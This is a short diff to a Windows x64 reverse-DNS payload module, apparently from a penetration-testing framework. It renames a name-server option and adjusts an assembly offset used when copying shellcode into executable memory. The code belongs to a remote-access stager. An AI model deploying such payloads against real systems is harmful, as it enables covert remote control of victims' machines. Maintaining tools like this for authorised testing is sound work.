@@ -26,7 +26,7 @@ module Payload::Windows::ReverseDns_x64
   def generate(opts={})
     ds = opts[:datastore] || datastore
     conf = {
-      ns_server:   ds['NS_SERVER'],
+      ns_server:   ds['NS_IP'],
       domain:      ds['DOMAIN'],
       server_id:   ds['SERVER_ID'],
       retry_count: ds['ReverseConnectRetries'],
@@ -424,7 +424,7 @@ module Payload::Windows::ReverseDns_x64
         add         [rsp + 0x48], rcx
         sub         [rsp + 0x50], rcx
         mov         rsi, rax
-        add         rsi, 0x23                    ; RSI <-  source
+        add         rsi, 0x2B                    ; RSI <-  source
         mov         rbx, [rsp]
         mov         rdi, [rsp + 0x58]
         add         rdi, rbx                     ; dst - RWX mem
